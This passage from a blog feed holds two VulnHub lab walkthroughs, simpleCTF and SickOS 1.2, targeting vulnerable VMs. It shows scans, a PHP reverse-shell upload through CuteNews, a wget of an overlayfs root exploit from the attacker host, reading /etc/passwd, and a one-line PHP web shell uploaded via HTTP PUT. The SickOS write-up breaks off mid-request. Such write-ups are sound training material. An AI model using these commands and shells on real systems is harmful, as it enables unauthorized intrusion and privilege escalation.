<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.134/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-06-07 07:39:25 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.134
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/simpleCTF# nmap -v -sV -A -O 10.1.1.134 -oN 134_nmap.txt
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Please Login / CuteNews
</span><span class='line'>MAC Address: 00:0C:29:29:7A:4E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Only port <code>80</code> is found and <code>Apache 2.4.7</code> is the HTTP server, also find that, from the title, the CMS is <code>CuteNews</code>.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.134
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.6
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Cookie CUTENEWS_SESSION created without the httponly flag
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4ec3e1d077c80
</span><span class='line'>+ IZUYPEIH Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ OSVDB-3268: GET /docs/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: GET /LICENSE.txt: License file found may identify site software.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span></code></pre></td></tr></table></div></figure>


<p>Nothing special, so next I open firefox to check the WEB application.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/simpleCTF/1.png"></p>

<p>I found a login page, also the WEB application is <code>CuteNews 2.0.3</code>.</p>

<p>By checking online, <code>CuteNews 2.0.3</code> has an known <a href="https://www.exploit-db.com/exploits/37474/" title="CuteNews 2.0.3 - Arbitrary File Upload Vulnerability">Remote File Upload Vulnerability</a>.</p>

<p>So I sign up a new user <code>f4l13n</code> and log in to <strong>Personal Option</strong>, then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">PHP reverse shell</a> <code>rsh443.php</code> as Avatar picture, here I use <strong>burp proxy</strong> to check the request.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/simpleCTF/2.png"></p>

<p>After the webshell uploaded successfully, I setup <code>nc</code> to listen on port <code>443</code> and wait for the reverse shell connect back.</p>

<p>Then go to <code>http://10.1.1.134/uploads/</code>, here I can find the uploaded PHP shell, by accessing this PHP file to trigger the shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.134<span class="o">]</span> 48114
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 05:35:36 up  1:57,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>messagebus:x:103:107::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
</span><span class='line'>bull:x:1000:1000:bull,,,:/home/bull:/bin/bash
</span></code></pre></td></tr></table></div></figure>


<p>Then after lots of enumeration, I found the overlayfs local root vulnerability can let me root in.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>wget http://10.1.1.130/privesc/37292.c -O /tmp/37292.c
</span><span class='line'>wget http://10.1.1.130/privesc/37292.c -O /tmp/37292.c
</span><span class='line'>--2016-06-07 06:06:10--  http://10.1.1.130/privesc/37292.c
</span><span class='line'>Connecting to 10.1.1.130:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">5123</span> <span class="o">(</span>5.0K<span class="o">)</span> <span class="o">[</span>text/x-csrc<span class="o">]</span>
</span><span class='line'>Saving to: <span class="s1">&#39;/tmp/37292.c&#39;</span>
</span><span class='line'>
</span><span class='line'>100%<span class="o">[======================================</span>&gt;<span class="o">]</span> 5,123       --.-K/s   in 0s
</span><span class='line'>
</span><span class='line'>2016-06-07 06:06:10 <span class="o">(</span>18.0 MB/s<span class="o">)</span> - <span class="s1">&#39;/tmp/37292.c&#39;</span> saved <span class="o">[</span>5123/5123<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>gcc 37292.c -o 37292
</span><span class='line'>gcc 37292.c -o 37292
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 200
</span><span class='line'>drwxrwxrwt  <span class="m">2</span> root     root       <span class="m">4096</span> Jun  <span class="m">7</span> 06:06 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root     root       <span class="m">4096</span> Sep  <span class="m">9</span>  <span class="m">2015</span> ..
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12502</span> Jun  <span class="m">7</span> 06:00 37088
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">6276</span> Sep  <span class="m">2</span>  <span class="m">2015</span> 37088.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12189</span> Jun  <span class="m">7</span> 06:06 37292
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">5123</span> Jun  <span class="m">7</span> 06:04 37292.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">25304</span> Aug <span class="m">19</span>  <span class="m">2015</span> lpc.py
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data <span class="m">119499</span> Jun  <span class="m">7</span> 05:48 lpc_rst.txt
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>./37292
</span><span class='line'>./37292
</span><span class='line'>spawning threads
</span><span class='line'>mount <span class="c">#1</span>
</span><span class='line'>mount <span class="c">#2</span>
</span><span class='line'>child threads <span class="k">done</span>
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library
</span><span class='line'><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="c"># pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/tmp
</span><span class='line'><span class="c"># cd /root</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="c"># ls</span>
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'><span class="c"># cat flag.txt    </span>
</span><span class='line'>cat flag.txt
</span><span class='line'>U wyn teh Interwebs!!1eleven11!!1!
</span><span class='line'>Hack the planet!
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>Done~</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SickOS 1.2]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2/"/>
    <updated>2016-06-05T17:03:17+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2</id>
    <content type="html"><![CDATA[<p>&ldquo;This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-12,144/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: SickOS: 1.2 (<em>10.1.1.133/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>File upload via HTTP PUT method</li>
<li>python reverse shell</li>
<li>chkrootkit 0.49 Local Root Exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Use dirb tool to discover hidden directory [<font color="FF8000">dirb</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit HTTP PUT Method to upload one-line PHP shell</li>
<li>Use python reverse shell to get a better shell</li>
<li>Enumeration &amp;&amp; Exploit <code>chkrootkit 0.49</code> to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://dirb.sourceforge.net/about.html">dirb</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheat sheet</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.133 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.133    00:0c:29:0f:eb:df   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f0:91:47   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.290 seconds <span class="o">(</span>111.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.133</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.133/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-06-05 04:39:01 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.133
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.133
</span></code></pre></td></tr></table></div></figure>


<p>There are 2 ports (22, 80) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 7.12 scan initiated Sun Jun  5 14:40:00 2016 as: nmap -sV -A -O -v -oN 133_nmap.txt 10.1.1.133</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.133
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp open  http    lighttpd 1.4.28
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-server-header: lighttpd/1.4.28
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>MAC Address: 00:0C:29:0F:EB:DF <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>Run <code>nikto</code> to scan WEB application, but nothing found.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.133
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
</span></code></pre></td></tr></table></div></figure>


<p>Then run <code>dirb</code> to discover potential hidden directories and one folder was found: <code>/test/</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# dirb http://10.1.1.133/
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.22
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Sun Jun  <span class="m">5</span> 14:46:31 2016
</span><span class='line'>URL_BASE: http://10.1.1.133/
</span><span class='line'>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: <span class="m">4612</span>
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://10.1.1.133/ ----
</span><span class='line'>+ http://10.1.1.133/index.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:163<span class="o">)</span>
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://10.1.1.133/test/
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://10.1.1.133/test/ ----
</span><span class='line'><span class="o">(</span>!<span class="o">)</span> WARNING: Directory IS LISTABLE. No need to scan it.
</span><span class='line'>    <span class="o">(</span>Use mode <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> you want to scan it anyway<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>END_TIME: Sun Jun  <span class="m">5</span> 14:46:34 2016
</span><span class='line'>DOWNLOADED: <span class="m">4612</span> - FOUND: 1
</span></code></pre></td></tr></table></div></figure>


<p>Then try to enumerate HTTP methods by using <code>curl</code>. Nothing found in <code>/</code> but lots methods are available in <code>/test/</code> including method <code>PUT</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X OPTIONS http://10.1.1.133/test
</span><span class='line'>*   Trying 10.1.1.133...
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; OPTIONS /test HTTP/1.1
</span><span class='line'>&gt; Host: 10.1.1.133
</span><span class='line'>&gt; User-Agent: curl/7.47.0
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">301</span> Moved Permanently
</span><span class='line'>&lt; DAV: 1,2
</span><span class='line'>&lt; MS-Author-Via: DAV
</span><span class='line'>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
</span><span class='line'>&lt; Location: http://10.1.1.133/test/
</span><span class='line'>&lt; Content-Length: 0
</span><span class='line'>&lt; Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 04:56:31 GMT
</span><span class='line'>&lt; Server: lighttpd/1.4.28
</span><span class='line'>&lt;
</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, uploading one-line PHP shell with <code>PUT</code> method.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X PUT -d <span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> http://10.1.1.133/test/shell.php
</span><span class='line'>*   Trying 10.1.1.133...
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; PUT /test/shell.php HTTP/1.1
</span><span class='line'>&gt; Host: 10.1.1.133
</span><span class='line'>&gt; User-Agent: curl/7.47.0
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Content-Length: 30
</span><span class='line'>&gt; Content-Type: application/x-www-form-urlencoded
</span><span class='line'>&gt;
